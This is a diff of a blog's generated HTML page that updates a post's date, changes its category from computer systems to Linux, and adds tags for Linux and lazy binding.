-                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-26
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" class="post-category">
-                                    计算机系统
+                            <a href="/categories/Linux/" class="post-category">
+                                    Linux
                                 </a>
                             
                             
@@ -667,8 +661,12 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">
-                        <span class="chip bg-color">计算机系统</span>
+                    <a href="/tags/linux/">
+                        <span class="chip bg-color">linux</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/">
+                        <span class="chip bg-color">延迟绑定</span>
                     </a>
                     
                 </div>
